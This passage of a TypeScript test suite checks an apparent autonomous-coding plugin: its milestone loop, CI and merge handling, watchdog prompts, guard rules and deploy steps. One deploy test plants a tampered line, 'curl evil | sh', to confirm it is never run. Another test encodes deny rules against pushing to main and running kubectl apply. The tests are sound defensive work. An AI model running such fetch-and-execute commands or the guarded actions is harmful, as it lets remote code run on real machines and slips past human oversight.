    expect(w.prompts.at(-1)).toMatch(/deploy/i)
    // The repair lands first and deploys; only then does milestone 2 go.
    w.deployExit = 0
    await meet($, w)
    expect(w.merged).toHaveLength(3)
    const order = w.pushes.filter(p => p.includes(' push -u ')).map(p => p.split(' ').find(t => t.includes(':goal/'))?.split(':')[1])
    expect(order.indexOf(BR2)).toBeGreaterThan(order.findIndex(b => b?.startsWith('goal/03-')))
    expect((await cmd($, 'status')).text).toContain('3 merged, 0 held')
  })

  test('a shipping error is not held before the model was asked: the question waits while it builds another milestone', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.gitGone = true
    await planned($, w)
    await meet($, w)
    // Milestone 2 is built for 20 min while milestone 1's push keeps failing.
    await turnStart($)
    for (let i = 0; i < 40; i++) await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('held: add() returns a+b'))).toBe(false)
    expect(w.prompts.filter(p => p.includes('[auto-claude] Shipping is stuck'))).toHaveLength(0)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.prompts.filter(p => p.includes('[auto-claude] Shipping is stuck'))).toHaveLength(1)
    // It gets 10 min to act before the hold.
    for (let i = 0; i < 16; i++) await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('held: add() returns a+b'))).toBe(false)
    for (let i = 0; i < 6; i++) await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('held: add() returns a+b'))).toBe(true)
  })

  test('only required checks decide: a red check that is not required does not block the merge (P1)', async ($, on) => {
    const w = world(on)
    w.github = true
    w.required = '[{"bucket":"pass"}]'
    w.checks = '[{"bucket":"pass"},{"bucket":"fail"}]'
    await planned($, w)
    await meet($, w)
    expect(w.runs.some(r => r.startsWith('gh pr checks 7 --repo o/r --required'))).toBe(true)
    expect(w.merged).toHaveLength(1)
    expect(parseQueue(w.files.get(GOALS) ?? '').some(i => i.base !== undefined)).toBe(false)
  })

  test('with no required checks every check decides, and a red one becomes a fix goal (P1)', async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pass"},{"bucket":"fail"}]'
    await planned($, w)
    await meet($, w)
    expect(w.merged).toHaveLength(0)
    expect(parseQueue(w.files.get(GOALS) ?? '').find(i => i.base !== undefined)?.condition).toContain('CI failed')
  })

  test('no checks reported right after the PR opens waits for the grace, then counts as no CI', async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = ''
    await planned($, w)
    await meet($, w)
    expect(w.merged).toHaveLength(0)
    for (let i = 0; i < 4; i++) await w.clock.advance(TICK)
    expect(w.merged).toHaveLength(1)
  })

  test('a merge whose reply was lost (a 502 after GitHub merged it) counts as merged (P3)', async ($, on) => {
    const w = world(on)
    w.github = true
    w.mergeFails = true
    await planned($, w)
    await meet($, w)
    expect((await cmd($, 'status')).text).toContain('1 merged, 0 held')
    expect(w.adds).toHaveLength(2)
  })

  test('a PR closed under the run is opened again once, then held', async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pending"}]'
    await planned($, w)
    await meet($, w)
    w.prState = 'CLOSED'
    w.checks = '[{"bucket":"pass"}]'
    await w.clock.advance(TICK)
    expect(w.runs.some(r => r.startsWith('gh pr reopen 7 --repo o/r'))).toBe(true)
    expect(w.merged).toHaveLength(1)
  })

  test('the check runs in a fresh checkout of the head fetched from origin before landing; a fix goal lands it', async ($, on) => {
    const w = world(on)
    w.github = true
    w.freshExit = 1
    await planned($, w)
    await meet($, w)
    expect(w.runs).toContain(`git -C /repo fetch -q origin ${BR1}`)
    expect(w.runs).toContain(`git -C /repo worktree add --detach /repo/worktrees/auto-verify origin/${BR1}`)
    expect(w.merged).toHaveLength(0)
    expect(w.files.get(GOALS) ?? '').toContain(`fresh checkout of origin/${BR1}`)
    w.freshExit = 0
    await w.clock.advance(TICK)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.merged).toHaveLength(1)
  })
})

describe('the watchdog (P2, P4, P5)', () => {
  test('a milestone whose session sits idle is prompted again at 1, 3 and 6 min, then blocked, and the run goes on', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await planned($, w)
    const wakes = () => w.prompts.filter(p => p.includes('the session sat idle') && p.includes('Milestone #1'))
    // The model ended its turn without a stop the loop could judge.
    await turnStart($)
    await turnEnd($)
    await w.clock.advance(TICK)
    expect(wakes()).toHaveLength(0)
    // Ticks are 30 s apart: the first one past 1 min of quiet wakes it.
    await w.clock.advance(2 * TICK)
    expect(wakes()).toHaveLength(1)
    expect(wakes()[0]).toContain('Milestone #1: add() returns a+b')
    expect(wakes()[0]).toContain('wake 1/3')
    // Busy turns are not quiet.
    await turnStart($)
    await w.clock.advance(30 * MIN)
    expect(wakes()).toHaveLength(1)
    await turnEnd($)
    for (let i = 0; i < 60; i++) await w.clock.advance(TICK)
    expect(wakes()).toHaveLength(3)
    // Still nothing after the third: the milestone is blocked and the next one starts.
    expect(w.files.get(GOALS)).toMatch(/- \[!\] add\(\) returns a\+b .*did not work on it after 3 prompts/)
    expect(w.adds.at(-1)).toContain(WT2)
    expect(w.notifies.some(n => n.includes('blocked: add() returns a+b') && n.includes('going on'))).toBe(true)
  })

  test('a stop being judged or a retry being armed is not quiet', async ($, on) => {
    const w = world(on)
    await planned($, w)
    // Five unmet stops in one turn: stuck, with a retry armed for 2 min.
    for (let i = 0; i < 4; i++) expect((await $.classic.Stop({ ...STOP })).block).toBeDefined()
    w.checkExit = 1
    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
    await w.clock.advance(2 * MIN + 1_200)
    expect(w.prompts.filter(p => p.includes('Retry 1/2'))).toHaveLength(1)
    expect(w.prompts.filter(p => p.includes('the session sat idle'))).toHaveLength(0)
  })

  test('a run clears a session /goal when it starts and refuses ProposeGoal and questions while it runs (P5)', async ($, on) => {
    const w = world(on)
    w.commandNames = ['goal']
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await $.tool.call({ tool: 'AskUserQuestion', questions: [] } as never)).deny).toBeUndefined()
    await cmd($, 'start')
    await w.clock.advance(200)
    expect(w.commands).toContain('goal clear')
    // Even while planning: nobody answers, and a session goal would hold the loop.
    expect((await $.tool.call({ tool: 'AskUserQuestion', questions: [] } as never)).deny).toContain('nobody can answer')
    expect((await $.tool.call({ tool: 'ProposeGoal', condition: 'x' } as never)).deny).toContain('session goal would block it')
    expect((await $.tool.call({ tool: 'EnterPlanMode' } as never)).deny).toContain('plan mode')
  })

  test('where the engine has no /goal, nothing is run to clear one', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await cmd($, 'start')
    await w.clock.advance(200)
    expect(w.commands).toEqual([])
  })

  test('an SSH remote that refuses the push is pushed over https instead (P2)', async ($, on) => {
    const w = world(on)
    w.github = true
    w.sshDenied = true
    await planned($, w)
    await meet($, w)
    expect(w.merged).toHaveLength(0)
    // An SSH push refused: the next one goes over https.
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes('push -u https://github.com/o/r.git'))).toBe(true)
    expect(w.merged).toHaveLength(1)
  })

  test('an error no remedy clears goes to the model at 5 checks, is held at 10, and a second hold for one cause stops the run', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.gitGone = true
    await planned($, w)
    await meet($, w)
    // Milestone 2 is built meanwhile, stacked on milestone 1's branch.
    expect(w.adds.at(-1)).toBe(`git -C /repo worktree add ${WT2} -b ${BR2} ${BR1}`)
    const asked = () => w.prompts.filter(p => p.includes('[auto-claude] Shipping is stuck'))
    for (let i = 0; i < 5; i++) await w.clock.advance(TICK)
    // The session is building milestone 2: the diagnosis waits for it.
    expect(asked()).toHaveLength(0)
    await turnStart($)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(asked()).toHaveLength(1)
    expect(asked()[0]).toContain('ENOENT')
    expect(asked()[0]).toContain('Do not merge or deploy')
    // Ten checks are not enough on their own: the error must also have lasted 15 min.
    for (let i = 0; i < 4; i++) await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('held: add() returns a+b'))).toBe(false)
    for (let i = 0; i < 26; i++) await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.startsWith('auto-claude (repo): held: add() returns a+b') && n.includes('going on'))).toBe(true)
    // Milestone 2 goes next, rebased off milestone 1's commits, and hits the same wall: the run stops instead of holding every milestone.
    expect(w.rebases).toContain(`git -C ${WT2} rebase --onto origin/main tip-of-${BR1}`)
    for (let i = 0; i < 32; i++) await w.clock.advance(TICK)
    expect(w.notifies.at(-1)).toContain('stopped: 2 milestones in a row were held for one cause (push)')
    expect((await cmd($, 'status')).text).toContain('phase stopped')
  })

  test('a CI that does not finish is re-run once, then held, and the run goes on (P1)', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pending"}]'
    w.runList = '[{"databaseId": 91, "status": "queued"}]'
    await planned($, w)
    await meet($, w)
    for (let i = 0; i < 5; i++) await w.clock.advance(5 * MIN)
    expect(w.runs.some(r => r.includes('gh run cancel 91'))).toBe(false)
    // Every run still queued after 30 min: no runner will take it.
    for (let i = 0; i < 2; i++) await w.clock.advance(5 * MIN)
    const rerun = w.runs.find(r => r.startsWith('bash -lc gh run cancel 91'))
    expect(rerun).toContain("gh run rerun 91 '--repo' 'o/r'")
    expect(rerun).toContain('= completed ] && break')
    expect(w.notifies.some(n => n.includes('cancelled and re-ran its runs'))).toBe(true)
    for (let i = 0; i < 7; i++) await w.clock.advance(5 * MIN)
    expect(w.notifies.some(n => n.includes('held: add() returns a+b (PR #7): CI did not finish'))).toBe(true)
    expect(w.adds.at(-1)).toContain(WT2)
  })

  test('an idle session never rests long and is never asked to check status: woken, then its milestone blocked', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await planned($, w)
    // The session does nothing with its milestone: woken at 1, 3 and 6 min, blocked at 12, the next one started.
    for (let i = 0; i < 26; i++) await w.clock.advance(TICK)
    expect(w.prompts.filter(p => p.includes('the session sat idle'))).toHaveLength(3)
    expect(w.adds.at(-1)).toContain(WT2)
    expect(w.prompts.at(-1)).toContain('Milestone #2')
    for (const n of w.notifies) expect(n).not.toContain('/auto-claude status')
  })
})

describe('the loop', () => {
  test('a failing check blocks without asking the model; uncommitted changes block even when it passes', async ($, on) => {
    const w = world(on)
    await planned($, w)
    w.checkExit = 1
    expect((await $.classic.Stop(STOP)).block).toContain('exited 1')
    expect(w.evaluations).toBe(0)
    w.checkExit = 0
    w.dirty = ' M counter.py'
    expect((await $.classic.Stop(STOP)).block).toContain('uncommitted')
    expect(w.evaluations).toBe(0)
  })

  test('stuck: two delayed retries with a change of approach, then blocked and the next milestone', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await planned($, w)
    w.checkExit = 1
    for (let round = 1; round <= 3; round++) {
      for (let i = 1; i <= 4; i++) expect((await $.classic.Stop(STOP)).block).toBeDefined()
      expect((await $.classic.Stop(STOP)).block).toBeUndefined()
      if (round < 3) {
        await w.clock.advance(120_000)
        expect(w.prompts.at(-1)).toContain(`Retry ${round}/2`)
      }
    }
    expect(w.files.get(GOALS)).toMatch(/- \[!\] add\(\) returns a\+b/)
    await w.clock.advance(1_200)
    expect(w.prompts.at(-1)).toContain('Milestone #2: sub() returns a-b')
  })

  test('an evaluator request the engine refuses retries the milestone instead of throwing', async ($, on) => {
    const w = world(on)
    await planned($, w)
    w.verdicts.push('throw')
    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
    await w.clock.advance(120_000)
    expect(w.prompts.at(-1)).toContain('Retry 1/2')
  })

  test('a transcript past the read cap is judged by a fork; a subagent\'s stop is not judged', async ($, on) => {
    const w = world(on)
    let forks = 0
    on('model.fork', () => {
      forks++
      return { value: { isAnswered: true as const, text: '{"met": false, "reason": "x"}', usage: USAGE } }
    })
    await planned($, w)
    expect((await $.classic.Stop({ ...STOP, agent_id: 'a1' })).block).toBeUndefined()
    expect(w.evaluations).toBe(0)
    w.files.delete('/tmp/s.jsonl')
    expect((await $.classic.Stop(STOP)).block).toContain('x')
    expect(forks).toBe(1)
    expect(w.evaluations).toBe(0)
  })

  test('defer_goal is refused early, then applied at the next stop, and the run goes on', async ($, on) => {
    const w = world(on)
    await planned($, w)
    w.checkExit = 1
    expect((await $.tool.call({ tool: 'mcp__auto-claude__defer_goal', reason: 'needs API key' } as never)).deny).toContain('Too early')
    await $.classic.Stop(STOP)
    await $.classic.Stop(STOP)
    expect((await $.tool.call({ tool: 'mcp__auto-claude__defer_goal', reason: 'needs API key' } as never)).deny).toBeUndefined()
    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
    expect(w.files.get(GOALS)).toMatch(/- \[!\] add\(\) returns a\+b .*deferred.*needs API key/)
    await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('deferred: add() returns a+b'))).toBe(true)
    expect(w.adds.at(-1)).toContain(WT2)
  })

  test('guards apply while a milestone is built, and only in the session running it', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await $.tool.call({ tool: 'Bash', command: 'git push origin main' } as never)).deny).toBeUndefined()
    await cmd($, 'start')
    w.files.set('/repo/.claude/auto-plan.md', PLAN)
    w.files.set(GOALS, QUEUE)
    await ready($)
    await w.clock.advance(1_200)
    expect((await $.tool.call({ tool: 'Bash', command: 'git push origin main' } as never)).deny).toContain('main')
    expect((await $.tool.call({ tool: 'Bash', command: `git push -u origin ${BR1}` } as never)).deny).toBeUndefined()
    expect((await $.tool.call({ tool: 'Bash', command: 'kubectl apply -f x.yaml' } as never)).deny).toContain('deploy and cluster commands are refused')
    expect((await $.tool.call({ tool: 'Bash', command: 'kubectl get pods' } as never)).deny).toBeUndefined()
    expect((await $.tool.call({ tool: 'Edit', file_path: '/repo/a.py', old_string: 'a', new_string: 'b' } as never)).deny).toContain('worktree')
    expect((await $.tool.call({ tool: 'Edit', file_path: `${WT1}/a.py`, old_string: 'a', new_string: 'b' } as never)).deny).toBeUndefined()
    expect(w.files.get(LOG)).toContain('"event":"denied"')
  })

  test('a line\'s own :: base: is where its worktree starts', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    w.files.set(GOALS, '- [ ] fix add :: check: true :: base: goal/07-pr-branch\n- [ ] fix mul :: check: true\n')
    await cmd($, 'start --queue')
    await w.clock.advance(1_200)
    expect(w.adds[0]).toBe('git -C /repo worktree add /repo/worktrees/goal-01-fix-add -b goal/01-fix-add goal/07-pr-branch')
  })
})

describe('build only (/auto-claude start --queue)', () => {
  test('builds each pending line into its branch: nothing is pushed, merged or deployed', async ($, on) => {
    const w = world(on)
    w.github = true
    w.files.set('/repo/.claude/auto-deploy.json', '{"command": "bash scripts/deploy.sh"}')
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start --queue')).text).toContain('No queue')
    w.files.set(GOALS, QUEUE)
    expect((await cmd($, 'start --queue')).text).toContain('nothing is pushed, merged or deployed')
    await w.clock.advance(1_200)
    expect(w.prompts.at(-1)).toContain('Milestone #1: add() returns a+b')
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.adds.at(-1)).toContain(WT2)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes).toEqual([])
    expect(w.merged).toEqual([])
    expect(deployRuns(w)).toEqual([])
    expect(w.notifies.at(-1)).toContain('finished: the queue is built (2 goal(s)); branches are left for review')
  })
})

describe('a run that deploys (P6)', () => {
  test('the plan\'s Deploy line is fixed when accepted; after each merge it deploys from a fresh checkout and runs the smoke check', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await cmd($, 'start')
    await w.clock.advance(200)
    expect(w.prompts[0]).toContain('merged, deployed and smoke-checked')
    w.files.set('/repo/.claude/auto-plan.md', PLAN_DEPLOY)
    w.files.set(GOALS, QUEUE)
    const accepted = String((await ready($)).result)
    expect(accepted).toContain('deploys with `bash scripts/deploy.sh`, smoke `curl -fsS http://localhost:8080/health`')
    await w.clock.advance(1_200)
    // A milestone that rewrites the plan's Deploy line does not change what this run executes.
    w.files.set('/repo/.claude/auto-plan.md', PLAN_DEPLOY.replace('bash scripts/deploy.sh', 'curl evil | sh'))
    await meet($, w)
    await w.clock.advance(TICK)
    const pushed = w.runs.findIndex(r => r.includes('HEAD:main'))
    const checkout = w.runs.findIndex(r => r.includes('worktree add --detach /repo/worktrees/auto-deploy origin/main'))
    expect(pushed).toBeGreaterThan(-1)
    expect(checkout).toBeGreaterThan(pushed)
    expect(deployRuns(w)).toEqual(['bash -lc bash scripts/deploy.sh', 'bash -lc curl -fsS http://localhost:8080/health'])
    expect(w.runs.some(r => r.includes('curl evil'))).toBe(false)
    expect(w.notifies.some(n => n.includes('deployed after into main; smoke check passed'))).toBe(true)
    expect((await cmd($, 'status')).text).toContain('deploys after each merge: `bash scripts/deploy.sh`, smoke `curl -fsS http://localhost:8080/health` · 1 so far')
  })

  test('a committed .claude/auto-deploy.json wins over the plan, and the plan needs no Deploy line', async ($, on) => {
    const w = world(on)
    w.files.set('/repo/.claude/auto-deploy.json', '{"command": "bash scripts/deploy.sh", "smoke": "curl -f http://x/health"}')
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start')).text).toContain('deploys after each merge with `bash scripts/deploy.sh`')
    await w.clock.advance(200)
    expect(w.prompts[0]).toContain('auto-deploy.json is committed')
    w.files.set('/repo/.claude/auto-plan.md', PLAN.replace(/Deploy:.*\n/, ''))
    w.files.set(GOALS, QUEUE)
    expect(String((await ready($)).result)).toContain('Plan accepted')
    await w.clock.advance(1_200)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(deployRuns(w)).toEqual(['bash -lc bash scripts/deploy.sh', 'bash -lc curl -f http://x/health'])
  })

  test('a deploy whose script is not on main yet waits; it runs once the milestone that adds it lands, and before the run is done', async ($, on) => {
    const w = world(on)
    w.missing.add('scripts/deploy.sh')
    await planned($, w, PLAN_DEPLOY)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(deployRuns(w)).toEqual([])
    expect((await cmd($, 'status')).text).toContain('a deploy is due')
    // Milestone 2 adds the script.
    w.missing.delete('scripts/deploy.sh')
    await meet($, w)
    for (let i = 0; i < 3; i++) await w.clock.advance(TICK)
    expect(deployRuns(w)).toHaveLength(2)
    expect(w.notifies.at(-1)).toContain('finished: the final check passed after 1 round(s) and what was merged is deployed')
  })

  test('a failed smoke check queues a deploy-fix milestone from main, built first; the run stays on and deploys again', async ($, on) => {
    const w = world(on)
    w.smokeExit = 7
    await planned($, w, PLAN_DEPLOY)
    await meet($, w)
    await w.clock.advance(TICK)
    const fix = parseQueue(w.files.get(GOALS) ?? '').find(i => i.base !== undefined)
    expect(fix).toMatchObject({ base: 'origin/main', check: undefined })
    expect(fix?.condition).toContain('the smoke check `curl -fsS http://localhost:8080/health` exited 7')
    expect(w.notifies.some(n => n.includes('a milestone that repairs the deploy goes first (deploy failure 1/3)'))).toBe(true)
    expect((await cmd($, 'status')).text).toContain('auto-claude on')
    // The repair is built next, from main, and lands; the deploy runs again and passes.
    await w.clock.advance(TICK)
    expect(w.adds.at(-1)).toMatch(/-b goal\/02-the-cause-of-the-failed-deplo[^ ]* origin\/main$/)
    // Mid-run the final check still fails: the repair is judged by the evaluator, not by it.
    w.checkExit = 1
    w.smokeExit = 0
    await meet($, w)
    w.checkExit = 0
    await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('deployed after into main; smoke check passed'))).toBe(true)
  })

  test('three deploys failing in a row stop the run: nothing more is merged on top of a broken live', async ($, on) => {
    const w = world(on)
    w.deployExit = 3
    await planned($, w, PLAN_DEPLOY)
    for (let i = 0; i < 3; i++) {
      await meet($, w)
      await w.clock.advance(TICK)
    }
    expect(w.notifies.at(-1)).toContain('stopped: the deploy after into main failed: `bash scripts/deploy.sh` exited 3')
    expect(w.notifies.at(-1)).toContain('3 deploys failed in a row')
  })

  test('with CodeQL asked for, an error-level result blocks the deploy and queues its repair; warnings are told and it deploys', async ($, on) => {
    const SARIF = '/home/auto-claude-codeql-repo-python.sarif'
    const w = world(on)
    w.files.set(SARIF, JSON.stringify({ runs: [{ results: [{ ruleId: 'py/sql-injection', level: 'error' }] }] }))
    await planned($, w, PLAN_DEPLOY.replace('CodeQL: none (a test fixture)', 'CodeQL: python'))
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.runs.some(r => r.startsWith('codeql database create /home/auto-claude-codeql-repo-python --language=python --source-root /repo/worktrees/auto-deploy'))).toBe(true)
    expect(deployRuns(w)).toEqual([])
    expect(w.files.get(GOALS) ?? '').toContain('CodeQL found 1 error-level result(s) in python (py/sql-injection ?:?)')
    w.files.set(SARIF, JSON.stringify({ runs: [{ results: [{ ruleId: 'py/log-injection', level: 'warning' }] }] }))
    await w.clock.advance(TICK)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(deployRuns(w)).toContain('bash -lc bash scripts/deploy.sh')
    expect(w.notifies.some(n => n.includes('CodeQL python: 1 warning(s), no errors'))).toBe(true)
  })

  test('a broken deploy file keeps the run from starting', async ($, on) => {
    const w = world(on)
    w.files.set('/repo/.claude/auto-deploy.json', '{"codeql": "python"}')
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start')).text).toContain('Not started: .claude/auto-deploy.json needs a "command" string')
  })
})

describe('a directory with no git repository', () => {
  test('start runs git init, ignores secrets, makes the first commit, and lands milestones in main itself', async ($, on) => {
    const w = world(on)
    w.repo = false
    w.origin = false
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    const text = (await cmd($, 'start build a tiny lib')).text ?? ''
    expect(text).toContain('auto-claude on in /repo')
    expect(text).toContain('Initialized a git repository')
    expect(text).toContain('No remote: milestones land in main')
    expect(w.runs.some(a => a.includes(' init -b main'))).toBe(true)
    expect(w.runs.some(a => a.includes('commit --allow-empty -m Initial commit'))).toBe(true)
    expect(w.runs.some(a => a.includes('config receive.denyCurrentBranch updateInstead'))).toBe(true)
    expect(w.files.get('/repo/.gitignore')).toMatch(/\.env[\s\S]*worktrees\//)
    await w.clock.advance(200)
    expect(w.prompts[0]).toContain('This repository has no remote')
    w.files.set('/repo/.claude/auto-plan.md', PLAN)
    w.files.set(GOALS, QUEUE)
    await ready($)
    await w.clock.advance(1_200)
    // The loop builds from the local branch, with no remote to fetch.
    expect(w.adds[0]).toBe(`git -C /repo worktree add ${WT1} -b ${BR1} main`)
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.some(a => a.endsWith(' push . HEAD:main'))).toBe(true)
    expect(w.runs.some(a => a.includes(' fetch '))).toBe(false)
    expect(w.runs.some(a => a.includes('rebase main'))).toBe(true)
  })

  test('the home directory is not bootstrapped', async ($, on) => {
    const w = world(on)
    w.repo = false
    w.cwd = '/home'
    await $.session.start({ cwd: '/home', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start')).text).toContain('Not a project directory')
    expect(w.runs.some(a => a.includes(' init'))).toBe(false)
  })
})
